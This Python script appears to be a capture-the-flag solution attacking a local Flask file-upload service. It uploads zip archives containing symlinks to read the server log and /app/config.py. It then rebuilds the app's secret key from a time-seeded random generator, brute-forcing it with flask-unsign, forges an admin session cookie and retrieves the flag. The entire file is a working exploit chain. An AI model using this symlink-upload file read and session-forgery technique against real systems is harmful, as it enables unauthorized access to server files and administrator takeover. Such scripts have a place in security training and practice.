#!/usr/bin/env python3
import requests
import subprocess
import os
import re
from pwn import info
from datetime import datetime
import random

server = "http://127.0.0.1:1337"

# register account
s = requests.session()
s.post(f"{server}/register", data = {
	"username": os.urandom(8).hex(),
	"password": os.urandom(8).hex()
})

### get gunicorn timestamp from server.log
subprocess.call("ln -s /tmp/server.log aaaaa && zip --symlinks f.zip aaaaa && rm aaaaa", shell=True)
r = s.post(f"{server}/upload", files = {
	"file": (
		"file",
		open("f.zip", "rb").read()
	)
})
id = re.findall(r'Your unique ID is <a href="/uploads/(.*)">', r.text)[0]

# read timestamp from server.log
timestamp = s.get(f"{server}/uploads/{id}/aaaaa").text.split('\n')[1]
info("Got server log:")
info(timestamp)
print(timestamp)
date = re.findall(r'\[(.*)\] \[\d.*Listening at', timestamp)[-1]
parsed = int(datetime.strptime(date, "%Y-%m-%d %H:%M:%S %z").timestamp() * 1000)
info(f"time.time() ~ {parsed}")

# get secret offset from config.py
subprocess.call("ln -s /app/config.py aaaaa && zip --symlinks f.zip aaaaa && rm aaaaa", shell=True)
r = s.post(f"{server}/upload", files = {
        "file": (
                "file",
                open("f.zip", "rb").read()
        )
})
id = re.findall(r'Your unique ID is <a href="/uploads/(.*)">', r.text)[0]

# read offset from config.py
conf_py = s.get(f"{server}/uploads/{id}/aaaaa").text
info("Got config.py:")
info(conf_py.split('\n')[4])
s_offset = re.findall(r'SECRET_OFFSET = (.*)\n', conf_py)[0]
info("SECRET_OFFSET = " + s_offset)
parsed += int(s_offset) * 1000

# bruteforce within error
poss_keys = []
for poss_date in range(parsed - 5000, parsed + 5000):
	random.seed(poss_date)
	poss_keys.append("".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", ""))

# write to wordlist then flask-unsign
with open("keys.txt", "w") as f:
	f.write("\n".join(poss_keys))
	f.close()
res = os.popen(f"flask-unsign -uc {s.cookies.get_dict().get('session')} -w keys.txt").read().split("\n")[0].strip("'")
info(f"Got secret: {res}")

# forge cookie
forged = os.popen(f"""flask-unsign -sc --secret={res} --cookie="{{\\"admin\\":True}}" """).read().split("\n")[0]
info(f"Forged cookie: {forged}")

# read flag
info(requests.get(f"{server}/flag", cookies = {"session": forged}).text)

# clean up
os.remove("f.zip")
os.remove("keys.txt")